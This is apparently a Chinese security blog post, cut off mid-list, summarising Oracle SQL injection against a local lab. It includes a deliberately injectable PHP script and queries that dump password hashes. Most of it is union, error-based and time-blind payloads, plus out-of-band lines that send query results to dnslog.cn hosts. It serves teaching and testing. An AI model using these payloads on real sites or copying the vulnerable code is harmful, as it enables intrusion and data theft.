@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"butnomingzi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"right","Muse | Mist":320,"Pisces | Gemini":240,"width":300,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="Oracle注入常用方法与命令执行的常用方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle小结">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/bb8356a5/index.html">
+<meta property="og:site_name" content="Tpp_Tgg">
+<meta property="og:description" content="Oracle注入常用方法与命令执行的常用方法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/001.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/002.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/003.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/004.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/005.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/006.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/007.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/008.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/009.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/010.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/011.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/012.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/013.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/014.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/015.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/016.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/017.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/018.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/019.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/020.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/021.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/022.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/bb8356a5/023.png">
+<meta property="article:published_time" content="2020-09-21T07:03:49.000Z">
+<meta property="article:modified_time" content="2020-09-21T07:06:49.501Z">
+<meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="ORACLE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butnomingzi.github.io/posts/bb8356a5/001.png">
+
+<link rel="canonical" href="https://butnomingzi.github.io/posts/bb8356a5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Oracle小结 | Tpp_Tgg</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tpp_Tgg</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/bb8356a5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Oracle小结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-21 15:03:49 / 修改时间：15:06:49" itemprop="dateCreated datePublished" datetime="2020-09-21T15:03:49+08:00">2020-09-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">知识整理</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>24k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>22 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Oracle注入常用方法与命令执行的常用方法。</p>
+<a id="more"></a>
+
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li><p>oracle</p>
+<p>这里测试环境版本：<code>Oracle Database 11g Release 11.2.0.1.0 - 64bit Production</code></p>
+</li>
+<li><p>PHP</p>
+<p>这里使用的是最新版的PHPSTUDY V8.1，默认安装的PHP版本为7.3，下载PHP的关于oracle的组件。将<code>php_oci8_11g.dll</code>,<code>php_oci8.dll</code>放在PHP安装文件夹的ext文件夹下。然后再php.ini中开启如下设置：</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extension&#x3D;php_oci8.dll</span><br><span class="line">extension&#x3D;php_oci8_11g.dll</span><br><span class="line"># 查看phpinfo时候，可以看到OCI8即可。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/001.png" alt="image-20200602112233342"></p>
+<h3 id="注入点构建"><a href="#注入点构建" class="headerlink" title="注入点构建"></a>注入点构建</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">///*</span></span><br><span class="line">$con = oci_connect(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;127.0.0.1/orcl.unicodesec&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;connected &quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Input:&quot;</span>.$id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	$sql = <span class="string">&quot;select id,username,password,phone from admin where id = &quot;</span>.$id;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$sql.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	$stmt = oci_parse($con, $sql);</span><br><span class="line">	oci_execute($stmt);</span><br><span class="line">	$nrows = oci_fetch_all($stmt, $results);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($nrows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;table border=\&quot;1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;th&gt;<span class="subst">$key</span>&lt;/th&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $nrows; $i++) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($results <span class="keyword">as</span> $data) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">$data</span>[<span class="subst">$i</span>]&lt;/td&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;\n&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;No data found&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/002.png" alt="image-20200602144555521"></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQjIlRTklQUElQTglRTYlOTYlODclRTUlODUlQUMlRTUlOEYlQjgvNDMwMTE1">甲骨文公司<i class="fa fa-external-link-alt"></i></span>的一款<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODUlQjMlRTclQjMlQkIlRTYlOTUlQjAlRTYlOEQlQUUlRTUlQkElOTMlRTclQUUlQTElRTclOTAlODYlRTclQjMlQkIlRTclQkIlOUYvMTEwMzIzODY=">关系数据库管理系统<i class="fa fa-external-link-alt"></i></span>。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。</p>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
+<li>select 必须要指明表名。若并非对真实的表进行查询，则需要用 <code>dual</code> 作为表名。</li>
+<li>单引号与双引号：Oracle 的单引号与 MySQL 一致，但是双引号用于消除系统关键字。例如，有个表的字段叫<code>sysdate</code>，因为<code>sysdate</code>属于<code>oracle</code>中的关键字，但你要查询这个字段的时候，就需要<code>select &quot;sysdate&quot; from dual;</code>，若用 <code>select &#39;sysdate&#39; from table_name;</code>查询就相当于 <code>select sysdate from table_name;</code>，而<code>sysdate</code> 用于获得当前时间。</li>
+<li>第 n 行的数据：<code>SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;</code>。</li>
+<li>拼接字符：<code>SELECT &#39;a&#39; || &#39;b&#39; FROM dual;</code>。</li>
+<li><code>case 语法</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code>。</li>
+<li>Oracle 中空字符串<code>&#39;&#39;</code>就是<code>null</code>（也就是说，只有<code>null</code>，没有空字符）。</li>
+</ul>
+<h3 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h3><ul>
+<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
+<li>all_tables : 当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</li>
+<li>user_tables: 当前用户名下的表的信息</li>
+<li>DBA_ALL_TABLES：<code>DBA</code> 用户所拥有的或有访问权限的对象和表</li>
+<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
+<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
+</ul>
+<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><ul>
+<li>服务器版本：<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code> 或者 <code>SELECT version FROM v$instance;</code>。</li>
+<li>操作系统版本：<code>SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</code>。</li>
+<li>当前数据库：<code>SELECT global_name FROM global_name;</code> 或者 <code>SELECT name FROM v$database;</code>或者<code>SELECT instance_name FROM v$instance;</code>或者<code>SELECT SYS.DATABASE_NAME FROM DUAL;</code>。</li>
+<li>获取当前用户权限的所有数据库：<code>SELECT DISTINCT owner, table_name FROM all_tables;</code></li>
+<li>表名：<code>SELECT table_name FROM all_tables;</code>。</li>
+<li>字段名：<code>SELECT column_name FROM all_tab_columns</code>。</li>
+</ul>
+<h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><p>描述：<code>Oracle</code>。</p>
+<ul>
+<li>当前数据库用户：<code>SELECT user FROM dual;</code>。</li>
+<li>所有数据库用户：<code>SELECT username FROM all_users ORDER BY username;</code> 或者 <code>SELECT name FROM sys.user$; -- priv</code>。</li>
+<li>所有数据库用户的密码 hash：<code>SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g</code> 或者 <code>SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g</code>。</li>
+<li>当前用户的权限：<code>SELECT * FROM session_privs;</code>。</li>
+<li>所有用户的权限：<code>SELECT * FROM dba_sys_privs -- priv</code>。</li>
+<li>用户角色：<code>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</code> 或者 <code>SELECT DISTINCT grantee FROM dba_sys_privs</code>。</li>
+</ul>
+<h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>没有什么过滤的情况下，Sqlmap一把梭是最快的。不过，还是需要了解一下常用的Oracle注入方式。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>直接来就好了，毕竟页面显示。</p>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.49.137/oracle.php?id=1 union <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">user</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.16</span><span class="number">.49</span><span class="number">.137</span>/oracle.php?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> utl_inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/003.png" alt="image-20200702172913714"></p>
+<ul>
+<li><code>decode</code>函数，如果正确则为1，错误为2。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(substr(user, 1, 1), &#39;t&#39;, (1&#x2F;1),2) from dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>instr</code>判断给出的字符串1是否在字符串2中。正确为1，错误为0.</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select instr((select user from dual),&#39;admin&#39;) FROM dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>utl_inaddr.get_host_name</code>这种方法在 <code>Oracle 8g</code>，<code>9g</code>，<code>10g</code>中不需要任何权限但是在<code>Oracle 11g</code>以及以后的版本中，官方加强了访问控制权限，所以在<code>11g</code>以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/004.png" alt="image-20200703093602971"></p>
+<ul>
+<li><code>ctxsys.drithsx.sn</code>Oracle 中用于处理文本，当传入参数类型错误时，会返回异常。</li>
+</ul>
+<p><img src="/posts/bb8356a5/005.png" alt="image-20200703093747004"></p>
+<ul>
+<li><code>CTXSYS.CTX_REPORT.TOKEN_TYPE</code>作用与 <code>ctxsys.drithsx.sn</code> 类似，用于处理文本。确保数据类型与前面语句一致，这里只能使用phone字段，<code>number</code>型，允许为空。。。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/006.png" alt="image-20200703094207462"></p>
+<ul>
+<li><code>XMLType</code> 在调用的时候必须以<code>&lt;:</code>开头，<code>&gt;</code>结尾，即 <code>&#39;&lt;:&#39;||balabala||&#39;&gt;&#39;</code> 或者 <code>chr(60)||balabal||chr(62）</code>。另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual;</span><br><span class="line">⚠️注意：该函数对应的数据类型为：XMLTYPE，使用unionc select 可能无法对应数据类型。</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual) is not null </span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/007.png" alt="image-20200703101217646"></p>
+<ul>
+<li><code>dbms_xdb_version.checkin</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum&#x3D;1)) from dual) is not null s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/008.png" alt="image-20200703101002277"></p>
+<ul>
+<li><code>dbms_xdb_version.makeversioned</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>dbms_xdb_version.uncheckout</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>dbms_utility.sqlid_to_sqlhash</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>ordsys.ord_dicom.getmappingxpath</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UTL_INADDR.get_host_address</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔和时间盲注，参考如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用时间延迟函数配合replace和substr以及decode来进行注入</span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and DBMS_PIPE.RECEIVE_MESSAGE(&#39;cc&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 3))&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;cc&#39;,3),0) from dual) is not null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/bb8356a5/009.png" alt="image-20200703153315774"></p>
+<h3 id="OOB外带"><a href="#OOB外带" class="headerlink" title="OOB外带"></a>OOB外带</h3><p>带外通信即使用 Oracle 发送<code>HTTP</code>或者<code>DNS</code>请求，将查询结果带到请求中，然后监测外网服务器的<code>HTTP</code>和<code>DNS</code>日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度。类似于 Windows 的MySQL 中利用 <code>LOAD_FILE</code> 的 dns 带外通信。</p>
+<p>借用DNSlog/CEYE的payload，尝试。</p>
+<ul>
+<li><code>utl_http.request()</code> 向外网主机发送 <code>http</code> 请求:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_http.request(&#39;http:&#x2F;&#x2F;&#39;||(select user from dual)||&#39;.d1a6j9.dnslog.cn&#x2F;&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>utl_inaddr.get_host_address</code>将查询结果拼接到域名下，并使用DNS记录解析日志。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_inaddr.get_host_address((select user from dual)||&#39;.ka255j.dnslog.cn&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>
+
+<ul>
